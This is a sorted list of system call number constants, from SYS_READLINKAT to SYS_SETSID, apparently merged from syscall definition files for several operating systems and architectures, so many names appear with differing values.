SYS_READLINKAT                   = 4298
SYS_READLINKAT              = 267
SYS_READLINKAT              = 294
SYS_READLINKAT              = 296
SYS_READLINKAT              = 298
SYS_READLINKAT              = 5257
SYS_READLINKAT              = 78
SYS_READLINKAT           = 469 // { int
SYS_READV                           = 0x357
SYS_READV                          = 120
SYS_READV                        = 145
SYS_READV                        = 4145
SYS_READV                   = 120
SYS_READV                   = 145
SYS_READV                   = 19
SYS_READV                   = 5018
SYS_READV                   = 65
SYS_READV                = 120 // { ssize_t
SYS_READV_NOCANCEL                 = 411
SYS_READ_NOCANCEL                  = 396
SYS_REALLOC                         = 0x05B
SYS_REALPATH                        = 0x378
SYS_REBOOT                         = 55
SYS_REBOOT                       = 4088
SYS_REBOOT                       = 88
SYS_REBOOT                   = 55  // { int reboot(int opt)
SYS_REBOOT                  = 142
SYS_REBOOT                  = 169
SYS_REBOOT                  = 5164
SYS_REBOOT                  = 55
SYS_REBOOT                  = 88
SYS_REBOOT                 = 55  // { int reboot(int opt)
SYS_REBOOT               = 208 // { int
SYS_REBOOT         = 55  // { int sys_reboot(int opt)
SYS_RECV                            = 0x358
SYS_RECV                         = 291
SYS_RECV                         = 336
SYS_RECV                         = 4175
SYS_RECV                    = 336
SYS_RECVFROM                        = 0x359
SYS_RECVFROM                       = 29
SYS_RECVFROM                     = 292
SYS_RECVFROM                     = 337
SYS_RECVFROM                     = 371
SYS_RECVFROM                     = 4176
SYS_RECVFROM                = 125
SYS_RECVFROM                = 207
SYS_RECVFROM                = 337
SYS_RECVFROM                = 371
SYS_RECVFROM                = 45
SYS_RECVFROM                = 5044
SYS_RECVFROM             = 29  // { ssize_t
SYS_RECVFROM_NOCANCEL              = 403
SYS_RECVMMSG                     = 337
SYS_RECVMMSG                     = 343
SYS_RECVMMSG                     = 365
SYS_RECVMMSG                     = 4335
SYS_RECVMMSG                = 243
SYS_RECVMMSG                = 299
SYS_RECVMMSG                = 328
SYS_RECVMMSG                = 343
SYS_RECVMMSG                = 357
SYS_RECVMMSG                = 5294
SYS_RECVMMSG             = 475 // { int
SYS_RECVMMSG_TIME64              = 417
SYS_RECVMMSG_TIME64              = 4417
SYS_RECVMSG                        = 27
SYS_RECVMSG                      = 297
SYS_RECVMSG                      = 342
SYS_RECVMSG                      = 372
SYS_RECVMSG                      = 4177
SYS_RECVMSG                 = 113
SYS_RECVMSG                 = 212
SYS_RECVMSG                 = 342
SYS_RECVMSG                 = 372
SYS_RECVMSG                 = 47
SYS_RECVMSG                 = 5046
SYS_RECVMSG              = 27  // { ssize_t
SYS_RECVMSG_NOCANCEL               = 401
SYS_RECVMSG_X                      = 480
SYS_REGCOMP                         = 0x138
SYS_REGERROR                        = 0x13B
SYS_REGEXEC                         = 0x139
SYS_REGFREE                         = 0x13A
SYS_RELEASE                         = 0x245
SYS_REMAINDER                       = 0x32A
SYS_REMAINDERD128                   = 0xC0D
SYS_REMAINDERD32                    = 0xC0B
SYS_REMAINDERD64                    = 0xC0C
SYS_REMAINDERF                      = 0x88A
SYS_REMAINDERL                      = 0x88B
SYS_REMAINDF                        = 0x88A
SYS_REMAINDL                        = 0x88B
SYS_REMAP_FILE_PAGES             = 239
SYS_REMAP_FILE_PAGES             = 253
SYS_REMAP_FILE_PAGES             = 257
SYS_REMAP_FILE_PAGES             = 4251
SYS_REMAP_FILE_PAGES        = 192
SYS_REMAP_FILE_PAGES        = 216
SYS_REMAP_FILE_PAGES        = 234
SYS_REMAP_FILE_PAGES        = 239
SYS_REMAP_FILE_PAGES        = 267
SYS_REMAP_FILE_PAGES        = 5210
SYS_REMOVE                          = 0x063
SYS_REMOVE      = 25
SYS_REMOVEXATTR                    = 238
SYS_REMOVEXATTR                  = 218
SYS_REMOVEXATTR                  = 235
SYS_REMOVEXATTR                  = 4233
SYS_REMOVEXATTR             = 14
SYS_REMOVEXATTR             = 181
SYS_REMOVEXATTR             = 197
SYS_REMOVEXATTR             = 218
SYS_REMOVEXATTR             = 233
SYS_REMOVEXATTR             = 5189
SYS_REMOVEXATTR          = 384 // { int
SYS_REMQUE                          = 0x2D0
SYS_REMQUO                          = 0x88D
SYS_REMQUOF                         = 0x88C
SYS_REMQUOL                         = 0x88E
SYS_RENAME                          = 0x064
SYS_RENAME                         = 128
SYS_RENAME                       = 38
SYS_RENAME                       = 4038
SYS_RENAME                   = 128 // { int rename(char 
SYS_RENAME                  = 128
SYS_RENAME                  = 38
SYS_RENAME                  = 5080
SYS_RENAME                  = 82
SYS_RENAME                 = 128 // { int rename(char 
SYS_RENAME               = 128 // { int
SYS_RENAME         = 128 // { int sys_rename(const char 
SYS_RENAMEAT                       = 465
SYS_RENAMEAT                     = 293
SYS_RENAMEAT                     = 302
SYS_RENAMEAT                     = 329
SYS_RENAMEAT                     = 4295
SYS_RENAMEAT                = 264
SYS_RENAMEAT                = 291
SYS_RENAMEAT                = 293
SYS_RENAMEAT                = 295
SYS_RENAMEAT                = 38
SYS_RENAMEAT                = 5254
SYS_RENAMEAT             = 458 // { int
SYS_RENAMEAT2                    = 353
SYS_RENAMEAT2                    = 357
SYS_RENAMEAT2                    = 382
SYS_RENAMEAT2                    = 4351
SYS_RENAMEAT2               = 276
SYS_RENAMEAT2               = 316
SYS_RENAMEAT2               = 345
SYS_RENAMEAT2               = 347
SYS_RENAMEAT2               = 357
SYS_RENAMEAT2               = 5311
SYS_RENAMEATX_NP                   = 488
SYS_RENDEZVOUS  = 34
SYS_REQUEST_KEY                  = 270
SYS_REQUEST_KEY                  = 287
SYS_REQUEST_KEY                  = 310
SYS_REQUEST_KEY                  = 4281
SYS_REQUEST_KEY             = 218
SYS_REQUEST_KEY             = 249
SYS_REQUEST_KEY             = 270
SYS_REQUEST_KEY             = 279
SYS_REQUEST_KEY             = 282
SYS_REQUEST_KEY             = 5240
SYS_RESERVED177             = 5177
SYS_RESERVED193             = 5193
SYS_RESERVED221                  = 4221
SYS_RESERVED82                   = 4082
SYS_RESIZE_ALLOC                    = 0xCEB
SYS_RESTART_SYSCALL              = 0
SYS_RESTART_SYSCALL              = 4253
SYS_RESTART_SYSCALL         = 0
SYS_RESTART_SYSCALL         = 128
SYS_RESTART_SYSCALL         = 219
SYS_RESTART_SYSCALL         = 5213
SYS_RESTART_SYSCALL         = 7
SYS_RES_INIT                        = 0x5D8
SYS_RES_MKQUERY                     = 0x5D7
SYS_RES_QUERY                       = 0x5D9
SYS_RES_QUERYDOMAIN                 = 0x5DC
SYS_RES_SEARCH                      = 0x5DA
SYS_RES_SEND                        = 0x5DB
SYS_REVOKE                         = 56
SYS_REVOKE                   = 56  // { int revoke(char 
SYS_REVOKE                 = 56  // { int revoke(char 
SYS_REVOKE               = 56  // { int
SYS_REVOKE         = 56  // { int sys_revoke(const char 
SYS_REWIND                          = 0x04B
SYS_REWINDDIR                       = 0x1B5
SYS_REWIND_UNLOCKED                 = 0xCC1
SYS_REXEC                           = 0x381
SYS_REXEC_AF                        = 0x81C
SYS_RFORK                    = 251 // { int rfork(int flags)
SYS_RFORK                  = 251 // { int rfork(int flags)
SYS_RFORK       = 19
SYS_RINDEX                          = 0x2BE
SYS_RINT                            = 0x329
SYS_RINTD128                        = 0xC13
SYS_RINTD32                         = 0xC11
SYS_RINTD64                         = 0xC12
SYS_RINTF                           = 0xACB
SYS_RINTL                           = 0xACD
SYS_RMDIR                           = 0x1B6
SYS_RMDIR                          = 137
SYS_RMDIR                        = 40
SYS_RMDIR                        = 4040
SYS_RMDIR                    = 137 // { int rmdir(char 
SYS_RMDIR                   = 137
SYS_RMDIR                   = 40
SYS_RMDIR                   = 5082
SYS_RMDIR                   = 84
SYS_RMDIR                  = 137 // { int rmdir(char 
SYS_RMDIR                = 137 // { int
SYS_RMDIR          = 137 // { int sys_rmdir(const char 
SYS_ROUND                           = 0xACF
SYS_ROUNDD128                       = 0xC16
SYS_ROUNDD32                        = 0xC14
SYS_ROUNDD64                        = 0xC15
SYS_ROUNDF                          = 0xAD2
SYS_ROUNDL                          = 0xAD5
SYS_RSEQ                         = 386
SYS_RSEQ                         = 387
SYS_RSEQ                         = 398
SYS_RSEQ                         = 4367
SYS_RSEQ                    = 293
SYS_RSEQ                    = 334
SYS_RSEQ                    = 365
SYS_RSEQ                    = 383
SYS_RSEQ                    = 387
SYS_RSEQ                    = 5327
SYS_RTAS                         = 255
SYS_RTAS                    = 255
SYS_RT_SIGACTION                 = 173
SYS_RT_SIGACTION                 = 174
SYS_RT_SIGACTION                 = 4194
SYS_RT_SIGACTION            = 102
SYS_RT_SIGACTION            = 13
SYS_RT_SIGACTION            = 134
SYS_RT_SIGACTION            = 173
SYS_RT_SIGACTION            = 174
SYS_RT_SIGACTION            = 5013
SYS_RT_SIGPENDING                = 175
SYS_RT_SIGPENDING                = 176
SYS_RT_SIGPENDING                = 4196
SYS_RT_SIGPENDING           = 104
SYS_RT_SIGPENDING           = 127
SYS_RT_SIGPENDING           = 136
SYS_RT_SIGPENDING           = 175
SYS_RT_SIGPENDING           = 176
SYS_RT_SIGPENDING           = 5125
SYS_RT_SIGPROCMASK               = 174
SYS_RT_SIGPROCMASK               = 175
SYS_RT_SIGPROCMASK               = 4195
SYS_RT_SIGPROCMASK          = 103
SYS_RT_SIGPROCMASK          = 135
SYS_RT_SIGPROCMASK          = 14
SYS_RT_SIGPROCMASK          = 174
SYS_RT_SIGPROCMASK          = 175
SYS_RT_SIGPROCMASK          = 5014
SYS_RT_SIGQUEUEINFO              = 177
SYS_RT_SIGQUEUEINFO              = 178
SYS_RT_SIGQUEUEINFO              = 4198
SYS_RT_SIGQUEUEINFO         = 106
SYS_RT_SIGQUEUEINFO         = 129
SYS_RT_SIGQUEUEINFO         = 138
SYS_RT_SIGQUEUEINFO         = 177
SYS_RT_SIGQUEUEINFO         = 178
SYS_RT_SIGQUEUEINFO         = 5127
SYS_RT_SIGRETURN                 = 172
SYS_RT_SIGRETURN                 = 173
SYS_RT_SIGRETURN                 = 4193
SYS_RT_SIGRETURN            = 101
SYS_RT_SIGRETURN            = 139
SYS_RT_SIGRETURN            = 15
SYS_RT_SIGRETURN            = 172
SYS_RT_SIGRETURN            = 173
SYS_RT_SIGRETURN            = 5211
SYS_RT_SIGSUSPEND                = 178
SYS_RT_SIGSUSPEND                = 179
SYS_RT_SIGSUSPEND                = 4199
SYS_RT_SIGSUSPEND           = 107
SYS_RT_SIGSUSPEND           = 130
SYS_RT_SIGSUSPEND           = 133
SYS_RT_SIGSUSPEND           = 178
SYS_RT_SIGSUSPEND           = 179
SYS_RT_SIGSUSPEND           = 5128
SYS_RT_SIGTIMEDWAIT              = 176
SYS_RT_SIGTIMEDWAIT              = 177
SYS_RT_SIGTIMEDWAIT              = 4197
SYS_RT_SIGTIMEDWAIT         = 105
SYS_RT_SIGTIMEDWAIT         = 128
SYS_RT_SIGTIMEDWAIT         = 137
SYS_RT_SIGTIMEDWAIT         = 176
SYS_RT_SIGTIMEDWAIT         = 177
SYS_RT_SIGTIMEDWAIT         = 5126
SYS_RT_SIGTIMEDWAIT_TIME64       = 421
SYS_RT_SIGTIMEDWAIT_TIME64       = 4421
SYS_RT_TGSIGQUEUEINFO            = 322
SYS_RT_TGSIGQUEUEINFO            = 335
SYS_RT_TGSIGQUEUEINFO            = 363
SYS_RT_TGSIGQUEUEINFO            = 4332
SYS_RT_TGSIGQUEUEINFO       = 240
SYS_RT_TGSIGQUEUEINFO       = 297
SYS_RT_TGSIGQUEUEINFO       = 322
SYS_RT_TGSIGQUEUEINFO       = 326
SYS_RT_TGSIGQUEUEINFO       = 330
SYS_RT_TGSIGQUEUEINFO       = 5291
SYS_S390_GUARDED_STORAGE    = 378
SYS_S390_PCI_MMIO_READ      = 353
SYS_S390_PCI_MMIO_WRITE     = 352
SYS_S390_RUNTIME_INSTR      = 342
SYS_S390_STHYI              = 380
SYS_SAMEQUANTUMD128                 = 0xC19
SYS_SAMEQUANTUMD32                  = 0xC17
SYS_SAMEQUANTUMD64                  = 0xC18
SYS_SBRK                     = 69  // { int sbrk(int incr)
SYS_SBRK                   = 69  // { caddr_t sbrk(size_t incr)
SYS_SBRK                 = 69  // { int
SYS_SCALB                           = 0x32B
SYS_SCALBLN                         = 0xAD8
SYS_SCALBLND128                     = 0xC1C
SYS_SCALBLND32                      = 0xC1A
SYS_SCALBLND64                      = 0xC1B
SYS_SCALBLNF                        = 0xADB
SYS_SCALBLNL                        = 0xADE
SYS_SCALBN                          = 0x4D4
SYS_SCALBND128                      = 0xC1F
SYS_SCALBND32                       = 0xC1D
SYS_SCALBND64                       = 0xC1E
SYS_SCALBNF                         = 0xAE3
SYS_SCALBNL                         = 0xAE6
SYS_SCANF                           = 0x070
SYS_SCANF_UNLOCKED                  = 0xCC2
SYS_SCHED_GETAFFINITY            = 223
SYS_SCHED_GETAFFINITY            = 242
SYS_SCHED_GETAFFINITY            = 4240
SYS_SCHED_GETAFFINITY       = 123
SYS_SCHED_GETAFFINITY       = 204
SYS_SCHED_GETAFFINITY       = 223
SYS_SCHED_GETAFFINITY       = 240
SYS_SCHED_GETAFFINITY       = 260
SYS_SCHED_GETAFFINITY       = 5196
SYS_SCHED_GETATTR                = 352
SYS_SCHED_GETATTR                = 356
SYS_SCHED_GETATTR                = 381
SYS_SCHED_GETATTR                = 4350
SYS_SCHED_GETATTR           = 275
SYS_SCHED_GETATTR           = 315
SYS_SCHED_GETATTR           = 344
SYS_SCHED_GETATTR           = 346
SYS_SCHED_GETATTR           = 356
SYS_SCHED_GETATTR           = 5310
SYS_SCHED_GETPARAM               = 155
SYS_SCHED_GETPARAM               = 4159
SYS_SCHED_GETPARAM          = 121
SYS_SCHED_GETPARAM          = 143
SYS_SCHED_GETPARAM          = 155
SYS_SCHED_GETPARAM          = 242
SYS_SCHED_GETPARAM          = 5140
SYS_SCHED_GETSCHEDULER           = 157
SYS_SCHED_GETSCHEDULER           = 4161
SYS_SCHED_GETSCHEDULER       = 330 // { int sched_getscheduler (pid_t pid)
SYS_SCHED_GETSCHEDULER      = 120
SYS_SCHED_GETSCHEDULER      = 145
SYS_SCHED_GETSCHEDULER      = 157
SYS_SCHED_GETSCHEDULER      = 244
SYS_SCHED_GETSCHEDULER      = 5142
SYS_SCHED_GETSCHEDULER     = 330 // { int sched_getscheduler (pid_t pid)
SYS_SCHED_GET_AFFINITY      = 161
SYS_SCHED_GET_PRIORITY_MAX       = 159
SYS_SCHED_GET_PRIORITY_MAX       = 4163
SYS_SCHED_GET_PRIORITY_MAX   = 332 // { int sched_get_priority_max (int policy)
SYS_SCHED_GET_PRIORITY_MAX  = 125
SYS_SCHED_GET_PRIORITY_MAX  = 146
SYS_SCHED_GET_PRIORITY_MAX  = 159
SYS_SCHED_GET_PRIORITY_MAX  = 246
SYS_SCHED_GET_PRIORITY_MAX  = 5143
SYS_SCHED_GET_PRIORITY_MAX = 332 // { int sched_get_priority_max (int policy)
SYS_SCHED_GET_PRIORITY_MIN       = 160
SYS_SCHED_GET_PRIORITY_MIN       = 4164
SYS_SCHED_GET_PRIORITY_MIN   = 333 // { int sched_get_priority_min (int policy)
SYS_SCHED_GET_PRIORITY_MIN  = 126
SYS_SCHED_GET_PRIORITY_MIN  = 147
SYS_SCHED_GET_PRIORITY_MIN  = 160
SYS_SCHED_GET_PRIORITY_MIN  = 247
SYS_SCHED_GET_PRIORITY_MIN  = 5144
SYS_SCHED_GET_PRIORITY_MIN = 333 // { int sched_get_priority_min (int policy)
SYS_SCHED_RR_GET_INTERVAL        = 161
SYS_SCHED_RR_GET_INTERVAL        = 4165
SYS_SCHED_RR_GET_INTERVAL   = 127
SYS_SCHED_RR_GET_INTERVAL   = 148
SYS_SCHED_RR_GET_INTERVAL   = 161
SYS_SCHED_RR_GET_INTERVAL   = 248
SYS_SCHED_RR_GET_INTERVAL   = 5145
SYS_SCHED_RR_GET_INTERVAL_TIME64 = 423
SYS_SCHED_RR_GET_INTERVAL_TIME64 = 4423
SYS_SCHED_SETAFFINITY            = 222
SYS_SCHED_SETAFFINITY            = 241
SYS_SCHED_SETAFFINITY            = 4239
SYS_SCHED_SETAFFINITY       = 122
SYS_SCHED_SETAFFINITY       = 203
SYS_SCHED_SETAFFINITY       = 222
SYS_SCHED_SETAFFINITY       = 239
SYS_SCHED_SETAFFINITY       = 261
SYS_SCHED_SETAFFINITY       = 5195
SYS_SCHED_SETATTR                = 351
SYS_SCHED_SETATTR                = 355
SYS_SCHED_SETATTR                = 380
SYS_SCHED_SETATTR                = 4349
SYS_SCHED_SETATTR           = 274
SYS_SCHED_SETATTR           = 314
SYS_SCHED_SETATTR           = 343
SYS_SCHED_SETATTR           = 345
SYS_SCHED_SETATTR           = 355
SYS_SCHED_SETATTR           = 5309
SYS_SCHED_SETPARAM               = 154
SYS_SCHED_SETPARAM               = 4158
SYS_SCHED_SETPARAM          = 118
SYS_SCHED_SETPARAM          = 142
SYS_SCHED_SETPARAM          = 154
SYS_SCHED_SETPARAM          = 241
SYS_SCHED_SETPARAM          = 5139
SYS_SCHED_SETSCHEDULER           = 156
SYS_SCHED_SETSCHEDULER           = 4160
SYS_SCHED_SETSCHEDULER      = 119
SYS_SCHED_SETSCHEDULER      = 144
SYS_SCHED_SETSCHEDULER      = 156
SYS_SCHED_SETSCHEDULER      = 243
SYS_SCHED_SETSCHEDULER      = 5141
SYS_SCHED_SET_AFFINITY      = 160
SYS_SCHED_YIELD                     = 0xB32
SYS_SCHED_YIELD                  = 158
SYS_SCHED_YIELD                  = 4162
SYS_SCHED_YIELD              = 331 // { int sched_yield (void)
SYS_SCHED_YIELD             = 124
SYS_SCHED_YIELD             = 158
SYS_SCHED_YIELD             = 24
SYS_SCHED_YIELD             = 245
SYS_SCHED_YIELD             = 5023
SYS_SCHED_YIELD            = 331 // { int sched_yield (void)
SYS_SCHED_YIELD          = 350 // { int
SYS_SCHED_YIELD    = 298 // { int sys_sched_yield(void)
SYS_SEARCHFS                       = 225
SYS_SECCOMP                      = 354
SYS_SECCOMP                      = 358
SYS_SECCOMP                      = 383
SYS_SECCOMP                      = 4352
SYS_SECCOMP                 = 277
SYS_SECCOMP                 = 317
SYS_SECCOMP                 = 346
SYS_SECCOMP                 = 348
SYS_SECCOMP                 = 358
SYS_SECCOMP                 = 5312
SYS_SECURITY                = 185
SYS_SEED48                          = 0x2EC
SYS_SEEK        = 39
SYS_SEEKDIR                         = 0x31D
SYS_SEGATTACH   = 30
SYS_SEGBRK      = 12
SYS_SEGDETACH   = 31
SYS_SEGFLUSH    = 33
SYS_SEGFREE     = 32
SYS_SELECT                          = 0x35B
SYS_SELECT                         = 93
SYS_SELECT                       = 82
SYS_SELECT                  = 142
SYS_SELECT                  = 23
SYS_SELECT                  = 82
SYS_SELECT                  = 93
SYS_SELECT               = 417 // { int
SYS_SELECTEX                        = 0x35C
SYS_SELECT_NOCANCEL                = 407
SYS_SEMACQUIRE  = 37
SYS_SEMCONFIG            = 223 // { int
SYS_SEMCTL                          = 0x27A
SYS_SEMCTL                         = 254
SYS_SEMCTL                       = 300
SYS_SEMCTL                       = 394
SYS_SEMCTL                       = 4394
SYS_SEMCTL                  = 191
SYS_SEMCTL                  = 394
SYS_SEMCTL                  = 5064
SYS_SEMCTL                  = 66
SYS_SEMGET                          = 0x27B
SYS_SEMGET                         = 255
SYS_SEMGET                       = 299
SYS_SEMGET                       = 393
SYS_SEMGET                       = 4393
SYS_SEMGET                  = 190
SYS_SEMGET                  = 393
SYS_SEMGET                  = 5062
SYS_SEMGET                  = 64
SYS_SEMGET               = 221 // { int
SYS_SEMOP                           = 0x27C
SYS_SEMOP                          = 256
SYS_SEMOP                        = 298
SYS_SEMOP                   = 193
SYS_SEMOP                   = 5063
SYS_SEMOP                   = 65
SYS_SEMOP                = 222 // { int
SYS_SEMRELEASE  = 38
SYS_SEMSYS                         = 251
SYS_SEMTIMEDOP                   = 312
SYS_SEMTIMEDOP              = 192
SYS_SEMTIMEDOP              = 220
SYS_SEMTIMEDOP              = 392
SYS_SEMTIMEDOP              = 5214
SYS_SEMTIMEDOP_TIME64            = 420
SYS_SEMTIMEDOP_TIME64            = 4420
SYS_SEM_CLOSE                      = 269
SYS_SEM_OPEN                       = 268
SYS_SEM_POST                       = 273
SYS_SEM_TRYWAIT                    = 272
SYS_SEM_UNLINK                     = 270
SYS_SEM_WAIT                       = 271
SYS_SEM_WAIT_NOCANCEL              = 420
SYS_SEND                            = 0x35D
SYS_SEND                         = 289
SYS_SEND                         = 334
SYS_SEND                         = 4178
SYS_SEND                    = 334
SYS_SENDFILE                       = 337
SYS_SENDFILE                     = 186
SYS_SENDFILE                     = 187
SYS_SENDFILE                     = 4207
SYS_SENDFILE                = 186
SYS_SENDFILE                = 187
SYS_SENDFILE                = 39
SYS_SENDFILE                = 40
SYS_SENDFILE                = 5039
SYS_SENDFILE                = 71
SYS_SENDFILE64                   = 226
SYS_SENDFILE64                   = 239
SYS_SENDFILE64                   = 4237
SYS_SENDFILE64              = 140
SYS_SENDMMSG                     = 345
SYS_SENDMMSG                     = 349
SYS_SENDMMSG                     = 374
SYS_SENDMMSG                     = 4343
SYS_SENDMMSG                = 269
SYS_SENDMMSG                = 307
SYS_SENDMMSG                = 336
SYS_SENDMMSG                = 349
SYS_SENDMMSG                = 358
SYS_SENDMMSG                = 5302
SYS_SENDMMSG             = 476 // { int
SYS_SENDMSG                        = 28
SYS_SENDMSG                      = 296
SYS_SENDMSG                      = 341
SYS_SENDMSG                      = 370
SYS_SENDMSG                      = 4179
SYS_SENDMSG                 = 114
SYS_SENDMSG                 = 211
SYS_SENDMSG                 = 341
SYS_SENDMSG                 = 370
SYS_SENDMSG                 = 46
SYS_SENDMSG                 = 5045
SYS_SENDMSG              = 28  // { ssize_t
SYS_SENDMSG_NOCANCEL               = 402
SYS_SENDMSG_X                      = 481
SYS_SENDSYSLOG     = 112 // { int sys_sendsyslog(const char 
SYS_SENDTO                          = 0x35F
SYS_SENDTO                         = 133
SYS_SENDTO                       = 290
SYS_SENDTO                       = 335
SYS_SENDTO                       = 369
SYS_SENDTO                       = 4180
SYS_SENDTO                  = 133
SYS_SENDTO                  = 206
SYS_SENDTO                  = 335
SYS_SENDTO                  = 369
SYS_SENDTO                  = 44
SYS_SENDTO                  = 5043
SYS_SENDTO               = 133 // { ssize_t
SYS_SENDTO_NOCANCEL                = 413
SYS_SEND_FILE                       = 0x503
SYS_SETATTRLIST                    = 221
SYS_SETATTRLISTAT                  = 524
SYS_SETAUDIT                 = 450 // { int setaudit(struct auditinfo 
SYS_SETAUDIT_ADDR                  = 358
SYS_SETAUDIT_ADDR            = 452 // { int setaudit_addr( struct auditinfo_addr 
SYS_SETAUID                        = 354
SYS_SETAUID                  = 448 // { int setauid(uid_t 
SYS_SETBUF                          = 0x06B
SYS_SETCONTEXT                      = 0x431
SYS_SETCONTEXT               = 422 // { int setcontext( const struct __ucontext 
SYS_SETCONTEXT           = 308 // { int
SYS_SETDOMAINNAME                = 121
SYS_SETDOMAINNAME                = 4121
SYS_SETDOMAINNAME           = 121
SYS_SETDOMAINNAME           = 162
SYS_SETDOMAINNAME           = 163
SYS_SETDOMAINNAME           = 171
SYS_SETDOMAINNAME           = 5166
SYS_SETEGID                         = 0x1B7
SYS_SETEGID                        = 182
SYS_SETEGID                  = 182 // { int setegid(gid_t egid)
SYS_SETEGID                = 182 // { int setegid(gid_t egid)
SYS_SETEGID              = 182 // { int
SYS_SETEGID        = 182 // { int sys_setegid(gid_t egid)
SYS_SETENV                          = 0x0C8
SYS_SETEUID                         = 0x1B8
SYS_SETEUID                        = 183
SYS_SETEUID                  = 183 // { int seteuid(uid_t euid)
SYS_SETEUID                = 183 // { int seteuid(uid_t euid)
SYS_SETEUID              = 183 // { int
SYS_SETEUID        = 183 // { int sys_seteuid(uid_t euid)
SYS_SETFIB                   = 175 // { int setfib(int fibnum)
SYS_SETFSGID                     = 139
SYS_SETFSGID                     = 4139
SYS_SETFSGID                = 123
SYS_SETFSGID                = 139
SYS_SETFSGID                = 152
SYS_SETFSGID                = 216
SYS_SETFSGID                = 229
SYS_SETFSGID                = 5121
SYS_SETFSGID32                   = 216
SYS_SETFSUID                     = 138
SYS_SETFSUID                     = 4138
SYS_SETFSUID                = 122
SYS_SETFSUID                = 138
SYS_SETFSUID                = 151
SYS_SETFSUID                = 215
SYS_SETFSUID                = 228
SYS_SETFSUID                = 5120
SYS_SETFSUID32                   = 215
SYS_SETGID                          = 0x1B9
SYS_SETGID                         = 181
SYS_SETGID                       = 4046
SYS_SETGID                       = 46
SYS_SETGID                   = 181 // { int setgid(gid_t gid)
SYS_SETGID                  = 106
SYS_SETGID                  = 144
SYS_SETGID                  = 214
SYS_SETGID                  = 46
SYS_SETGID                  = 5104
SYS_SETGID                 = 181 // { int setgid(gid_t gid)
SYS_SETGID               = 181 // { int
SYS_SETGID         = 181 // { int sys_setgid(gid_t gid)
SYS_SETGID32                     = 214
SYS_SETGRENT                        = 0x282
SYS_SETGROUPS                       = 0x217
SYS_SETGROUPS                      = 80
SYS_SETGROUPS                    = 4081
SYS_SETGROUPS                    = 81
SYS_SETGROUPS               = 116
SYS_SETGROUPS               = 159
SYS_SETGROUPS               = 206
SYS_SETGROUPS               = 5114
SYS_SETGROUPS               = 80
SYS_SETGROUPS               = 81
SYS_SETGROUPS            = 80  // { int
SYS_SETGROUPS32                  = 206
SYS_SETHOSTENT                      = 0x360
SYS_SETHOSTNAME                  = 4074
SYS_SETHOSTNAME                  = 74
SYS_SETHOSTNAME             = 161
SYS_SETHOSTNAME             = 170
SYS_SETHOSTNAME             = 5165
SYS_SETHOSTNAME             = 74
SYS_SETHOSTNAME             = 88
SYS_SETIBMOPT                       = 0x478
SYS_SETIBMSOCKOPT                   = 0x479
SYS_SETIPV4SOURCEFILTER             = 0xC76
SYS_SETITIMER                       = 0x274
SYS_SETITIMER                      = 83
SYS_SETITIMER                    = 104
SYS_SETITIMER                    = 4104
SYS_SETITIMER               = 103
SYS_SETITIMER               = 104
SYS_SETITIMER               = 38
SYS_SETITIMER               = 5036
SYS_SETITIMER               = 83
SYS_SETITIMER            = 425 // { int
SYS_SETJMP                          = 0x05F
SYS_SETKEY                          = 0x2AE
SYS_SETLOCAL                        = 0x03A
SYS_SETLOCALE                       = 0x03A
SYS_SETLOGIN                       = 50
SYS_SETLOGIN                 = 50  // { int setlogin(char 
SYS_SETLOGIN               = 50  // { int setlogin(char 
SYS_SETLOGIN       = 50  // { int sys_setlogin(const char 
SYS_SETLOGINCLASS            = 524 // { int setloginclass(const char 
SYS_SETLOGMASK                      = 0x373
SYS_SETNETENT                       = 0x361
SYS_SETNS                        = 346
SYS_SETNS                        = 350
SYS_SETNS                        = 375
SYS_SETNS                        = 4344
SYS_SETNS                   = 268
SYS_SETNS                   = 308
SYS_SETNS                   = 337
SYS_SETNS                   = 339
SYS_SETNS                   = 350
SYS_SETNS                   = 5303
SYS_SETPEER                         = 0x362
SYS_SETPGID                         = 0x1BA
SYS_SETPGID                        = 82
SYS_SETPGID                      = 4057
SYS_SETPGID                      = 57
SYS_SETPGID                 = 109
SYS_SETPGID                 = 154
SYS_SETPGID                 = 185
SYS_SETPGID                 = 5107
SYS_SETPGID                 = 57
SYS_SETPGID              = 82  // { int
SYS_SETPGRP                         = 0x29E
SYS_SETPRIORITY                     = 0x272
SYS_SETPRIORITY                    = 96
SYS_SETPRIORITY                  = 4097
SYS_SETPRIORITY                  = 97
SYS_SETPRIORITY             = 140
SYS_SETPRIORITY             = 141
SYS_SETPRIORITY             = 5138
SYS_SETPRIORITY             = 96
SYS_SETPRIORITY             = 97
SYS_SETPRIORITY          = 96  // { int
SYS_SETPRIVEXEC                    = 152
SYS_SETPROTOENT                     = 0x363
SYS_SETPWENT                        = 0x285
SYS_SETREGID                        = 0x377
SYS_SETREGID                       = 127
SYS_SETREGID                     = 4071
SYS_SETREGID                     = 71
SYS_SETREGID                = 114
SYS_SETREGID                = 127
SYS_SETREGID                = 143
SYS_SETREGID                = 204
SYS_SETREGID                = 5112
SYS_SETREGID                = 71
SYS_SETREGID             = 127 // { int
SYS_SETREGID32                   = 204
SYS_SETRESGID                    = 169
SYS_SETRESGID                    = 170
SYS_SETRESGID                    = 4190
SYS_SETRESGID               = 110
SYS_SETRESGID               = 119
SYS_SETRESGID               = 149
SYS_SETRESGID               = 169
SYS_SETRESGID               = 210
SYS_SETRESGID               = 5117
SYS_SETRESGID32                  = 210
SYS_SETRESUID                    = 164
SYS_SETRESUID                    = 4185
SYS_SETRESUID               = 108
SYS_SETRESUID               = 117
SYS_SETRESUID               = 147
SYS_SETRESUID               = 164
SYS_SETRESUID               = 208
SYS_SETRESUID               = 5115
SYS_SETRESUID32                  = 208
SYS_SETREUID                        = 0x376
SYS_SETREUID                       = 126
SYS_SETREUID                     = 4070
SYS_SETREUID                     = 70
SYS_SETREUID                = 113
SYS_SETREUID                = 126
SYS_SETREUID                = 145
SYS_SETREUID                = 203
SYS_SETREUID                = 5111
SYS_SETREUID                = 70
SYS_SETREUID             = 126 // { int
SYS_SETREUID32                   = 203
SYS_SETRLIMIT                       = 0x293
SYS_SETRLIMIT                      = 195
SYS_SETRLIMIT                    = 4075
SYS_SETRLIMIT                    = 75
SYS_SETRLIMIT               = 145
SYS_SETRLIMIT               = 160
SYS_SETRLIMIT               = 164
SYS_SETRLIMIT               = 5155
SYS_SETRLIMIT               = 75
SYS_SETRLIMIT            = 195 // { int
SYS_SETRTABLE      = 310 // { int sys_setrtable(int rtableid)
SYS_SETSERVENT                      = 0x364
SYS_SETSGROUPS                     = 287
SYS_SETSID                          = 0x1BB
SYS_SETSID                         = 147
SYS_SETSID                       = 4066
SYS_SETSID                       = 66
SYS_SETSID                   = 147 // { int setsid(void)
SYS_SETSID                  = 112
